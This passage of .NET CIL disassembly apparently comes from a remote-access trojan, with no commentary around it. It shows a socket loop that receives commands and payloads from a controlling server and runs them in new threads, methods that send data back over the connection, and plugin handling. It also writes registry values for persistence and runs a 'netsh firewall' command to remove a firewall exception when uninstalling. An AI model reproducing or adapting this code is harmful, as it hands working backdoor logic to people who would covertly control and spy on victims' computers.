      IL_004a:  stloc.s    V_13
      IL_004c:  ldloc.s    V_13
      IL_004e:  brfalse.s  IL_0056

      IL_0050:  nop
      IL_0051:  leave      IL_0263

      IL_0056:  nop
      IL_0057:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005c:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0061:  ldc.i4.1
      IL_0062:  clt
      IL_0064:  stloc.s    V_13
      IL_0066:  ldloc.s    V_13
      IL_0068:  brfalse.s  IL_007c

      IL_006a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_006f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0074:  ldc.i4.m1
      IL_0075:  ldc.i4.0
      IL_0076:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_007b:  pop
      IL_007c:  nop
      IL_007d:  nop
      IL_007e:  nop
      IL_007f:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0084:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0089:  ldc.i4.0
      IL_008a:  cgt
      IL_008c:  stloc.s    V_13
      IL_008e:  ldloc.s    V_13
      IL_0090:  brfalse    IL_023b

      IL_0095:  ldloc.0
      IL_0096:  ldc.i4.m1
      IL_0097:  conv.i8
      IL_0098:  ceq
      IL_009a:  stloc.s    V_14
      IL_009c:  ldloc.s    V_14
      IL_009e:  brfalse    IL_015b

      IL_00a3:  ldstr      ""
      IL_00a8:  stloc.s    V_4
      IL_00aa:  br         IL_0151

      IL_00af:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b4:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_00b9:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_00be:  stloc.s    V_5
      IL_00c0:  nop
      IL_00c1:  ldloc.s    V_5
      IL_00c3:  ldc.i4.m1
      IL_00c4:  sub
      IL_00c5:  stloc.s    V_15
      IL_00c7:  ldloc.s    V_15
      IL_00c9:  switch     ( 
                            IL_00d8,
                            IL_00e1)
      IL_00d6:  br.s       IL_012c

      IL_00d8:  nop
      IL_00d9:  nop
      IL_00da:  leave      IL_0263

      IL_00df:  br.s       IL_012c

      IL_00e1:  nop
      IL_00e2:  ldloc.s    V_4
      IL_00e4:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00e9:  stloc.0
      IL_00ea:  ldstr      ""
      IL_00ef:  stloc.s    V_4
      IL_00f1:  ldloc.0
      IL_00f2:  ldc.i4.0
      IL_00f3:  conv.i8
      IL_00f4:  ceq
      IL_00f6:  stloc.s    V_14
      IL_00f8:  ldloc.s    V_14
      IL_00fa:  brfalse.s  IL_010a

      IL_00fc:  ldstr      ""
      IL_0101:  call       bool j.OK::Send(string)
      IL_0106:  pop
      IL_0107:  ldc.i4.m1
      IL_0108:  conv.i8
      IL_0109:  stloc.0
      IL_010a:  nop
      IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0110:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0115:  ldc.i4.0
      IL_0116:  cgt
      IL_0118:  ldc.i4.0
      IL_0119:  ceq
      IL_011b:  stloc.s    V_14
      IL_011d:  ldloc.s    V_14
      IL_011f:  brfalse.s  IL_0126

      IL_0121:  br         IL_0028

      IL_0126:  nop
      IL_0127:  br         IL_007e

      IL_012c:  nop
      IL_012d:  ldloc.s    V_4
      IL_012f:  ldloc.s    V_5
      IL_0131:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0136:  stloc.s    V_12
      IL_0138:  ldloca.s   V_12
      IL_013a:  call       instance string [mscorlib]System.Char::ToString()
      IL_013f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0144:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0149:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_014e:  stloc.s    V_4
      IL_0150:  nop
      IL_0151:  ldc.i4.1
      IL_0152:  stloc.s    V_14
      IL_0154:  ldloc.s    V_14
      IL_0156:  brtrue     IL_00af

      IL_015b:  nop
      IL_015c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0161:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0166:  ldc.i4.1
      IL_0167:  add.ovf
      IL_0168:  ldc.i4.1
      IL_0169:  sub.ovf
      IL_016a:  ldc.i4.1
      IL_016b:  add.ovf
      IL_016c:  newarr     [mscorlib]System.Byte
      IL_0171:  stsfld     uint8[] j.OK::b
      IL_0176:  ldloc.0
      IL_0177:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_017c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0181:  sub.ovf
      IL_0182:  stloc.3
      IL_0183:  ldsfld     uint8[] j.OK::b
      IL_0188:  ldlen
      IL_0189:  conv.ovf.i4
      IL_018a:  conv.i8
      IL_018b:  ldloc.3
      IL_018c:  cgt
      IL_018e:  stloc.s    V_14
      IL_0190:  ldloc.s    V_14
      IL_0192:  brfalse.s  IL_01a9

      IL_0194:  ldloc.3
      IL_0195:  ldc.i4.1
      IL_0196:  conv.i8
      IL_0197:  sub.ovf
      IL_0198:  conv.ovf.i4
      IL_0199:  ldc.i4.1
      IL_019a:  add.ovf
      IL_019b:  ldc.i4.1
      IL_019c:  sub.ovf
      IL_019d:  ldc.i4.1
      IL_019e:  add.ovf
      IL_019f:  newarr     [mscorlib]System.Byte
      IL_01a4:  stsfld     uint8[] j.OK::b
      IL_01a9:  nop
      IL_01aa:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_01af:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_01b4:  ldsfld     uint8[] j.OK::b
      IL_01b9:  ldc.i4.0
      IL_01ba:  ldsfld     uint8[] j.OK::b
      IL_01bf:  ldlen
      IL_01c0:  conv.ovf.i4
      IL_01c1:  ldc.i4.0
      IL_01c2:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_01c7:  stloc.2
      IL_01c8:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01cd:  ldsfld     uint8[] j.OK::b
      IL_01d2:  ldc.i4.0
      IL_01d3:  ldloc.2
      IL_01d4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01d9:  nop
      IL_01da:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01df:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_01e4:  ldloc.0
      IL_01e5:  ceq
      IL_01e7:  stloc.s    V_14
      IL_01e9:  ldloc.s    V_14
      IL_01eb:  brfalse.s  IL_0235

      IL_01ed:  ldc.i4.m1
      IL_01ee:  conv.i8
      IL_01ef:  stloc.0
      IL_01f0:  ldnull
      IL_01f1:  ldftn      void j.OK::_Lambda__1(object)
      IL_01f7:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_01fc:  ldc.i4.1
      IL_01fd:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0202:  stloc.s    V_6
      IL_0204:  ldloc.s    V_6
      IL_0206:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_020b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0210:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0215:  nop
      IL_0216:  ldloc.s    V_6
      IL_0218:  ldc.i4.s   100
      IL_021a:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_021f:  pop
      IL_0220:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0225:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_022a:  nop
      IL_022b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0230:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0235:  nop
      IL_0236:  br         IL_0028

      IL_023b:  nop
      IL_023c:  leave.s    IL_0260

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023e:  dup
      IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0244:  stloc.s    V_8
      IL_0246:  nop
      IL_0247:  ldloc.s    V_8
      IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024e:  nop
      IL_024f:  ldloc.s    V_8
      IL_0251:  stloc.s    V_7
      IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0258:  nop
      IL_0259:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_025e:  leave.s    IL_0260

    }  // end handler
    IL_0260:  nop
    IL_0261:  nop
    IL_0262:  nop
    IL_0263:  nop
    IL_0264:  nop
    .try
    {
      IL_0265:  ldsfld     object j.OK::PLG
      IL_026a:  ldnull
      IL_026b:  ceq
      IL_026d:  ldc.i4.0
      IL_026e:  ceq
      IL_0270:  stloc.s    V_14
      IL_0272:  ldloc.s    V_14
      IL_0274:  brfalse.s  IL_029c

      IL_0276:  ldsfld     object j.OK::PLG
      IL_027b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0280:  ldnull
      IL_0281:  ldstr      "clear"
      IL_0286:  ldc.i4.0
      IL_0287:  newarr     [mscorlib]System.Object
      IL_028c:  ldnull
      IL_028d:  ldnull
      IL_028e:  ldnull
      IL_028f:  ldc.i4.1
      IL_0290:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0295:  pop
      IL_0296:  ldnull
      IL_0297:  stsfld     object j.OK::PLG
      IL_029c:  nop
      IL_029d:  leave.s    IL_02c1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_029f:  dup
      IL_02a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a5:  stloc.s    V_10
      IL_02a7:  nop
      IL_02a8:  ldloc.s    V_10
      IL_02aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02af:  nop
      IL_02b0:  ldloc.s    V_10
      IL_02b2:  stloc.s    V_9
      IL_02b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02b9:  nop
      IL_02ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02bf:  leave.s    IL_02c1

    }  // end handler
    IL_02c1:  nop
    IL_02c2:  ldc.i4.0
    IL_02c3:  stsfld     bool j.OK::Cn
    IL_02c8:  call       bool j.OK::connect()
    IL_02cd:  ldc.i4.0
    IL_02ce:  ceq
    IL_02d0:  stloc.s    V_14
    IL_02d2:  ldloc.s    V_14
    IL_02d4:  brfalse.s  IL_02d8

    IL_02d6:  br.s       IL_0263

    IL_02d8:  nop
    IL_02d9:  ldc.i4.1
    IL_02da:  stsfld     bool j.OK::Cn
    IL_02df:  br         IL_0002

    IL_02e4:  nop
    IL_02e5:  ret
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldarga.s   S
    IL_0003:  call       uint8[] j.OK::SB(string&)
    IL_0008:  call       bool j.OK::Sendb(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       288 (0x120)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             uint8[] V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.IO.FileInfo V_9,
             string V_10,
             bool V_11)
    IL_0000:  nop
    IL_0001:  ldsfld     bool j.OK::Cn
    IL_0006:  ldc.i4.0
    IL_0007:  ceq
    IL_0009:  stloc.s    V_11
    IL_000b:  ldloc.s    V_11
    IL_000d:  brfalse.s  IL_0016

    IL_000f:  ldc.i4.0
    IL_0010:  stloc.0
    IL_0011:  br         IL_011e

    IL_0016:  nop
    IL_0017:  nop
    .try
    {
      IL_0018:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_001d:  stloc.1
      IL_001e:  nop
      IL_001f:  ldloc.1
      IL_0020:  stloc.s    V_9
      IL_0022:  ldloc.s    V_9
      IL_0024:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      IL_0029:  nop
      IL_002a:  nop
      .try
      {
        IL_002b:  ldsfld     bool j.OK::Cn
        IL_0030:  ldc.i4.0
        IL_0031:  ceq
        IL_0033:  stloc.s    V_11
        IL_0035:  ldloc.s    V_11
        IL_0037:  brfalse.s  IL_0040

        IL_0039:  ldc.i4.0
        IL_003a:  stloc.0
        IL_003b:  leave      IL_011e

        IL_0040:  nop
        IL_0041:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0046:  stloc.s    V_4
        IL_0048:  ldarg.0
        IL_0049:  ldlen
        IL_004a:  conv.ovf.i4
        IL_004b:  stloc.3
        IL_004c:  ldloca.s   V_3
        IL_004e:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0053:  ldstr      bytearray (00 00 ) 
        IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_005d:  stloc.s    V_10
        IL_005f:  ldloca.s   V_10
        IL_0061:  call       uint8[] j.OK::SB(string&)
        IL_0066:  stloc.2
        IL_0067:  ldloc.s    V_4
        IL_0069:  ldloc.2
        IL_006a:  ldc.i4.0
        IL_006b:  ldloc.2
        IL_006c:  ldlen
        IL_006d:  conv.ovf.i4
        IL_006e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0073:  nop
        IL_0074:  ldloc.s    V_4
        IL_0076:  ldarg.0
        IL_0077:  ldc.i4.0
        IL_0078:  ldarg.0
        IL_0079:  ldlen
        IL_007a:  conv.ovf.i4
        IL_007b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0080:  nop
        IL_0081:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0086:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008b:  ldloc.s    V_4
        IL_008d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0092:  ldc.i4.0
        IL_0093:  ldloc.s    V_4
        IL_0095:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_009a:  conv.ovf.i4
        IL_009b:  ldc.i4.0
        IL_009c:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_00a1:  pop
        IL_00a2:  nop
        IL_00a3:  leave.s    IL_00ae

      }  // end .try
      finally
      {
        IL_00a5:  ldloc.s    V_9
        IL_00a7:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_00ac:  nop
        IL_00ad:  endfinally
      }  // end handler
      IL_00ae:  leave.s    IL_0115

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b0:  dup
      IL_00b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b6:  stloc.s    V_6
      IL_00b8:  nop
      IL_00b9:  ldloc.s    V_6
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  nop
      IL_00c1:  ldloc.s    V_6
      IL_00c3:  stloc.s    V_5
      IL_00c5:  nop
      .try
      {
        IL_00c6:  ldsfld     bool j.OK::Cn
        IL_00cb:  stloc.s    V_11
        IL_00cd:  ldloc.s    V_11
        IL_00cf:  brfalse.s  IL_00e2

        IL_00d1:  ldc.i4.0
        IL_00d2:  stsfld     bool j.OK::Cn
        IL_00d7:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00dc:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00e1:  nop
        IL_00e2:  nop
        IL_00e3:  leave.s    IL_0107

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e5:  dup
        IL_00e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00eb:  stloc.s    V_8
        IL_00ed:  nop
        IL_00ee:  ldloc.s    V_8
        IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00f5:  nop
        IL_00f6:  ldloc.s    V_8
        IL_00f8:  stloc.s    V_7
        IL_00fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00ff:  nop
        IL_0100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0105:  leave.s    IL_0107

      }  // end handler
      IL_0107:  nop
      IL_0108:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010d:  nop
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  leave.s    IL_0115

    }  // end handler
    IL_0115:  nop
    IL_0116:  ldsfld     bool j.OK::Cn
    IL_011b:  stloc.0
    IL_011c:  br.s       IL_011e

    IL_011e:  ldloc.0
    IL_011f:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       104 (0x68)
    .maxstack  4
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  ldarg.2
      IL_0037:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_003c:  nop
      IL_003d:  ldc.i4.1
      IL_003e:  stloc.0
      IL_003f:  leave.s    IL_0061

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0041:  dup
      IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0047:  stloc.3
      IL_0048:  nop
      IL_0049:  ldloc.3
      IL_004a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004f:  nop
      IL_0050:  ldloc.3
      IL_0051:  stloc.2
      IL_0052:  ldc.i4.0
      IL_0053:  stloc.0
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  nop
      IL_005a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005f:  leave.s    IL_0061

    }  // end handler
    IL_0061:  nop
    IL_0062:  ldloc.0
    IL_0063:  stloc.1
    IL_0064:  br.s       IL_0066

    IL_0066:  ldloc.1
    IL_0067:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       485 (0x1e5)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             bool V_12)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void j.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  ldc.i4.0
    IL_0009:  stsfld     bool j.OK::Isu
    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0014:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0019:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001e:  ldsfld     string j.OK::sf
      IL_0023:  ldc.i4.1
      IL_0024:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0029:  ldsfld     string j.OK::RG
      IL_002e:  ldc.i4.0
      IL_002f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0034:  nop
      IL_0035:  leave.s    IL_0055

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0037:  dup
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  stloc.1
      IL_003e:  nop
      IL_003f:  ldloc.1
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0045:  nop
      IL_0046:  ldloc.1
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  nop
      IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0053:  leave.s    IL_0055

    }  // end handler
    IL_0055:  nop
    IL_0056:  nop
    .try
    {
      IL_0057:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_005c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0061:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0066:  ldsfld     string j.OK::sf
      IL_006b:  ldc.i4.1
      IL_006c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0071:  ldsfld     string j.OK::RG
      IL_0076:  ldc.i4.0
      IL_0077:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_007c:  nop
      IL_007d:  leave.s    IL_009d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_007f:  dup
      IL_0080:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0085:  stloc.3
      IL_0086:  nop
      IL_0087:  ldloc.3
      IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008d:  nop
      IL_008e:  ldloc.3
      IL_008f:  stloc.2
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0095:  nop
      IL_0096:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009b:  leave.s    IL_009d

    }  // end handler
    IL_009d:  nop
    IL_009e:  nop
    .try
    {
      IL_009f:  ldstr      "netsh firewall delete allowedprogram \""
      IL_00a4:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00a9:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00ae:  ldstr      "\""
      IL_00b3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b8:  ldc.i4.0
      IL_00b9:  ldc.i4.0
      IL_00ba:  ldc.i4.m1
      IL_00bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00c0:  pop
      IL_00c1:  leave.s    IL_00e5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c3:  dup
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c9:  stloc.s    V_5
      IL_00cb:  nop
      IL_00cc:  ldloc.s    V_5
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d3:  nop
      IL_00d4:  ldloc.s    V_5
      IL_00d6:  stloc.s    V_4
      IL_00d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00dd:  nop
      IL_00de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e3:  leave.s    IL_00e5

    }  // end handler
    IL_00e5:  nop
    IL_00e6:  nop
    .try
    {
      IL_00e7:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00ec:  ldnull
      IL_00ed:  ceq
      IL_00ef:  ldc.i4.0
      IL_00f0:  ceq
      IL_00f2:  stloc.s    V_12
      IL_00f4:  ldloc.s    V_12
      IL_00f6:  brfalse.s  IL_0123

      IL_00f8:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00fd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0102:  nop
